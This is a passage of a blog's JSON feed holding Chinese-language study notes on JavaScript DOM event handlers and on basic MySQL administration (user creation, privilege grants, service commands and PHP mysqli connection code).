punctuation\">(</span><span class=\"token string\">\"fname\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tx<span class=\"token punctuation\">.</span>value<span class=\"token operator\">=</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">//value 就是你输入的值（所以事先输入的 value 是初始值！！！）</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//toUpperCase () 是内置函数，用于小写转大写，对其他没有影响</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>输入你的名字:</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>fname<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onchange</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">myFunction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>当你离开输入框后，函数将被触发，将小写字母转为大写字母。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h6 id=\"onmousedown\"><a class=\"anchor\" href=\"#onmousedown\">#</a> <a href=\"%E9%BC%A0%E6%A0%87%E6%91%81%E7%9D%80%E8%BF%99%E9%87%8C%E6%97%B6\">onmousedown</a> 与<a href=\"%E6%B2%A1%E6%91%81%E7%9D%80%E6%97%B6,%E6%88%96%E8%80%85%E8%AF%B4%E9%87%8A%E6%94%BE%E6%97%B6\"> onmouseup</a></h6>\n<h6 id=\"onmouseover\"><a class=\"anchor\" href=\"#onmouseover\">#</a> <a href=\"%E9%BC%A0%E6%A0%87%E7%A7%BB%E5%8A%A8%E5%88%B0%E6%AD%A4%E5%A4%84%E6%97%B6\">onmouseover</a> 和 <a href=\"%E4%B8%8D%E5%9C%A8%E6%AD%A4%E5%A4%84%E6%97%B6\">onmouseout</a></h6>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token special-attr\"><span class=\"token attr-name\">onmouseover</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">mOver</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onmouseout</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">mOut</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span>#D94A38<span class=\"token punctuation\">;</span><span class=\"token property\">width</span><span class=\"token punctuation\">:</span>120px<span class=\"token punctuation\">;</span><span class=\"token property\">height</span><span class=\"token punctuation\">:</span>20px<span class=\"token punctuation\">;</span><span class=\"token property\">padding</span><span class=\"token punctuation\">:</span>40px<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span>Mouse Over Me<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">mOver</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">obj</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tobj<span class=\"token punctuation\">.</span>innerHTML<span class=\"token operator\">=</span><span class=\"token string\">\"Thank You\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">mOut</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">obj</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tobj<span class=\"token punctuation\">.</span>innerHTML<span class=\"token operator\">=</span><span class=\"token string\">\"Mouse Over Me\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h6 id=\"extra-this\"><a class=\"anchor\" href=\"#extra-this\">#</a> EXTRA this</h6>\n<p>这里说说这个 this，它是 js 中的一个关键字，它在函数被调用时自动创建并用作指向调用该函数的上下文的引用。</p>\n<p>在函数中它代表了调用函数的这个元素（作为一个对象）。</p>\n<p>如果将其填入变量位置，则表示调用这个函数的这个元素的值。（就像上面）</p>\n<p>也就是说</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>onmouseover<span class=\"token operator\">=</span><span class=\"token string\">\"mOver(this)\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">mOver</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">obj</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tobj<span class=\"token punctuation\">.</span>innerHTML<span class=\"token operator\">=</span><span class=\"token string\">\"Thank You\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>与</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>onmouseover<span class=\"token operator\">=</span><span class=\"token string\">\"mOver()\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">mOver</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>innerHTML<span class=\"token operator\">=</span><span class=\"token string\">\"Thank You\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>实际上是一样的</pre></td></tr></table></figure><h6 id=\"onfocus\"><a class=\"anchor\" href=\"#onfocus\">#</a> <a href=\"%E8%8E%B7%E5%8F%96%E5%88%B0%E7%84%A6%E7%82%B9%E6%97%B6%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%A2%AB%E9%80%89%E4%B8%AD%E6%97%B6%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%A8%E4%BA%8E%E8%BE%93%E5%85%A5%E6%A1%86%EF%BC%8C%E5%8D%B3input\">onfocus</a></h6>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">myFunction</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tx<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>background<span class=\"token operator\">=</span><span class=\"token string\">\"yellow\"</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 是的，只有 background</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>输入你的名字: <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onfocus</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">myFunction</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>当输入框获取焦点时，修改背景色（background-color属性） 将被触发。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>其他事件对象：<a href=\"https://www.runoob.com/jsref/dom-obj-event.html\">https://www.runoob.com/jsref/dom-obj-event.html</a></p>\n<h5 id=\"7addeventlistener\"><a class=\"anchor\" href=\"#7addeventlistener\">#</a> 7.addEventListener()</h5>\n<p>用于为元素添加一个或多个事件句柄（其实就是 onclick 之类的） 不会覆盖，可以重复。</p>\n<p>比如：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>该实例使用 addEventListener() 方法在按钮中添加点击事件。 <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>myBtn<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>点我<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>demo<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"myBtn\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">addEventListener</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"click\"</span><span class=\"token punctuation\">,</span> displayDate<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">/*           存在 removeEventListener ()，移除事件监听，可以用 document.getElementById (\"myBtn\").removeEventListener (\"click\", displayDate) 来实现                                               */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">displayDate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"demo\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token function\">Date</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span>    <span class=\"token comment\">// 要有条件才调用，不要像这里多此一举</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>IE8 以及之前的用的是 attachEvent () 和 detachEvent ()</p>\n<p>解决办法：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> x <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"myBtn\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>addEventListener<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                    </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token comment\">// 所有主流浏览器，除了 IE 8 及更早版本    </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tx<span class=\"token punctuation\">.</span><span class=\"token function\">addEventListener</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"click\"</span><span class=\"token punctuation\">,</span> myFunction<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>attachEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// IE 8 及更早版本    </span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tx<span class=\"token punctuation\">.</span><span class=\"token function\">attachEvent</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"onclick\"</span><span class=\"token punctuation\">,</span> myFunction<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "技术"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2024/10/11/MySQL/",
            "url": "https://zhewanyiershinicheng.github.io/2024/10/11/MySQL/",
            "title": "MySQL",
            "date_published": "2024-10-11T09:48:50.000Z",
            "content_html": "<h1 id=\"mysql\"><a class=\"anchor\" href=\"#mysql\">#</a> MySQL</h1>\n<h2 id=\"基本术语\"><a class=\"anchor\" href=\"#基本术语\">#</a> 基本术语</h2>\n<p>列：具有相同数据类型的数据的集合</p>\n<p>行：每一行用来描述某条记录的具体信息</p>\n<p>冗余：存储两倍数据。冗余降低了性能，但提高了数据的安全性</p>\n<p>主键：主键是唯一的，一个数据表只能由一个主键。可以用主键查询信息</p>\n<p>外键： 一个表中的一列或多列，这些列的值必须与另一个表（通常称为主表）中的主键或唯一键的值相匹配，或者为空值。包含外键的表称为从表（或子表），被引用的表称为主表（或父表）。</p>\n<p>复合键：复合键（组合键）将多个列组成一个索引键，一般用于复合索引</p>\n<p>索引：使用索引可快速访问数据表中的特定信息，索引是数据库中由一列或多列的值进行排序的结构。相当于书籍的目录。</p>\n<p>参照完整性：参照的完整性要求关系中不允许引入不存在的实体。</p>\n<p>值：行的具体信息，每个值必须与该列的数据类型相同</p>\n<p>键：键的值在当前列中具有唯一性</p>\n<p><img loading=\"lazy\" data-src=\"1737622524881.png\" alt=\"1737622524881\" /></p>\n<h2 id=\"管理\"><a class=\"anchor\" href=\"#管理\">#</a> 管理</h2>\n<p>Windows:</p>\n<p>启动 / 关闭</p>\n<p>去找 <strong>services.msc</strong></p>\n<p>或者使用命令 net start/stop mysql</p>\n<p>Linux:</p>\n<h3 id=\"启动关闭\"><a class=\"anchor\" href=\"#启动关闭\">#</a> 启动 / 关闭</h3>\n<pre><code>sudo systemctl start/stop mysql\n</code></pre>\n<p>在一些老旧的版本：</p>\n<pre><code>sudo service mysql start/stop\n</code></pre>\n<h3 id=\"重启\"><a class=\"anchor\" href=\"#重启\">#</a> 重启</h3>\n<pre><code>sudo systemctl restart mysql\n</code></pre>\n<p>或者</p>\n<pre><code>sudo service mysql restart\n</code></pre>\n<h3 id=\"检查状态\"><a class=\"anchor\" href=\"#检查状态\">#</a> 检查状态</h3>\n<pre><code>sudo systemctl status mysql\n</code></pre>\n<p>或者</p>\n<pre><code>sudo service mysql status\n</code></pre>\n<h3 id=\"用户设置\"><a class=\"anchor\" href=\"#用户设置\">#</a> 用户设置</h3>\n<h4 id=\"创建\"><a class=\"anchor\" href=\"#创建\">#</a> 创建</h4>\n<pre><code class=\"language-mysql\">CREATE USER 'username'@'host' IDENTIFIED BY 'password';\n</code></pre>\n<ul>\n<li><code>username</code> ：用户名。</li>\n<li><code>host</code> ：指定用户可以从哪些主机连接。例如， <code>localhost</code>  仅允许本地连接， <code>%</code>  允许从任何主机连接。</li>\n<li><code>password</code> ：用户的密码。</li>\n</ul>\n<p>例如：</p>\n<pre><code class=\"language-mysql\">CREATE USER 'john'@'localhost' IDENTIFIED BY 'password123';\n</code></pre>\n<h4 id=\"删除\"><a class=\"anchor\" href=\"#删除\">#</a> 删除</h4>\n<pre><code class=\"language-mysql\">DROP USER 'username'@'host';\n</code></pre>\n<h4 id=\"修改密码\"><a class=\"anchor\" href=\"#修改密码\">#</a> 修改密码</h4>\n<pre><code>ALTER USER 'username'@'host' IDENTIFIED BY 'new_password';\n</code></pre>\n<h4 id=\"修改用户主机\"><a class=\"anchor\" href=\"#修改用户主机\">#</a> 修改用户主机</h4>\n<pre><code class=\"language-mysql\">-- 删除旧用户\nDROP USER 'john'@'localhost';\n\n-- 重新创建用户并指定新的主机\nCREATE USER 'john'@'%' IDENTIFIED BY 'password123';\n</code></pre>\n<h4 id=\"授权\"><a class=\"anchor\" href=\"#授权\">#</a> 授权</h4>\n<pre><code class=\"language-mysql\">GRANT privileges ON database_name.* TO 'username'@'host';\n</code></pre>\n<ul>\n<li><code>privileges</code> ：所需的权限，如  <code>ALL PRIVILEGES</code> 、 <code>SELECT</code> 、 <code>INSERT</code> 、 <code>UPDATE</code> 、 <code>DELETE</code>  等。</li>\n<li><code>database_name.*：</code> 表示对某个数据库或表授予权限。 <code>database_name.*</code>  表示对整个数据库的所有表授予权限， <code>database_name.table_name</code>  表示对指定的表授予权限。</li>\n<li><code>TO 'username'@'host'</code> ：指定授予权限的用户和主机。</li>\n</ul>\n<p>例如：</p>\n<pre><code class=\"language-mysql\">GRANT ALL PRIVILEGES ON test_db.* TO 'john'@'localhost';\n</code></pre>\n<h4 id=\"授权或者撤权都要刷新才能生效\"><a class=\"anchor\" href=\"#授权或者撤权都要刷新才能生效\">#</a> 授权或者撤权都要刷新才能生效：</h4>\n<pre><code class=\"language-mysql\">FLUSH PRIVILEGES;\n</code></pre>\n<h4 id=\"查权\"><a class=\"anchor\" href=\"#查权\">#</a> 查权</h4>\n<pre><code class=\"language-mysql\">SHOW GRANTS FOR 'username'@'host';\n</code></pre>\n<h4 id=\"撤权\"><a class=\"anchor\" href=\"#撤权\">#</a> 撤权</h4>\n<pre><code class=\"language-mysql\">REVOKE ALL PRIVILEGES ON test_db.* FROM 'john'@'localhost';\n</code></pre>\n<h4 id=\"创建并指定权限\"><a class=\"anchor\" href=\"#创建并指定权限\">#</a> 创建并指定权限</h4>\n<pre><code class=\"language-mysql\">CREATE USER 'john'@'localhost' IDENTIFIED BY 'password123' WITH GRANT OPTION;  //加上这句\nGRANT ALL PRIVILEGES ON test_db.* TO 'john'@'localhost';\n</code></pre>\n<h4 id=\"etcmycnf-文件配置\"><a class=\"anchor\" href=\"#etcmycnf-文件配置\">#</a> /etc/my.cnf 文件配置</h4>\n<p><img loading=\"lazy\" data-src=\"1737720361989.png\" alt=\"1737720361989\" /></p>\n<p><img loading=\"lazy\" data-src=\"1737720387003.png\" alt=\"1737720387003\" /></p>\n<h3 id=\"管理命令\"><a class=\"anchor\" href=\"#管理命令\">#</a> 管理命令</h3>\n<p>1.use 数据库名</p>\n<p>​\t\t使用该命令后所有 Mysql 命令都只针对该数据库</p>\n<p>2.SHOW DATABASES</p>\n<p>​\t\t显示所有数据库列表</p>\n<p>3.SHOW TABLES</p>\n<p>​\t\t显示某数据库的所有表（所以要先 use）</p>\n<p>4.SHOW COLUMNS FROM 数据表</p>\n<p>​\t\t 显示数据表的属性，属性类型，主键信息 ，是否为 NULL，默认值等其\t\t他信息</p>\n<p>5.SHOW INDEX FROM 数据表</p>\n<p>​\t\t显示索引，包括主键</p>\n<p>6.SHOW TABLE STATUS [FROM db_name] [LIKE 'pattern'] \\G</p>\n<p>​\t\t该命令将输出 Mysql 数据库管理系统的性能及统计信息。</p>\n<p>例如：</p>\n<pre><code class=\"language-mysql\">SHOW TABLE STATUS FROM 数据库名;\nSHOW TABLE STATUS from RUNOOB LIKE 'runoob%'; \n#显示以runoob%开头的表的信息\nSHOW TABLE STATUS from RUNOOB LIKE 'runoob%'\\G;\n#\\G，查询结果按列打印\n</code></pre>\n<h2 id=\"php语法\"><a class=\"anchor\" href=\"#php语法\">#</a> PHP 语法</h2>\n<h3 id=\"1连接\"><a class=\"anchor\" href=\"#1连接\">#</a> 1. 连接</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$servername</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"localhost\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"your_username\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"your_password\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$database</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"your_database\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 创建连接</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$servername</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$database</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">// 检测连接，可见 mysqli_connect 是有返回值的</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"连接失败: \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"连接成功\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>其中的函数格式和部分功能：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>函数定义：<span class=\"token function\">mysqli_function</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">,</span>value<span class=\"token punctuation\">,</span><span class=\"token operator\">...</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mysqli_connect</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$connect</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$connect</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"SQL 语句\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">mysqli_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 都是内置的函数</span></pre></td></tr></table></figure><h4 id=\"二进制连接\"><a class=\"anchor\" href=\"#二进制连接\">#</a> 二进制连接</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql <span class=\"token parameter variable\">-u</span> your_username <span class=\"token parameter variable\">-p</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//-u 指定用户名，-p 要输入密码</pre></td></tr></table></figure><h4 id=\"使用脚本连接\"><a class=\"anchor\" href=\"#使用脚本连接\">#</a> 使用脚本连接</h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mysqli_connect</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">,</span> password<span class=\"token 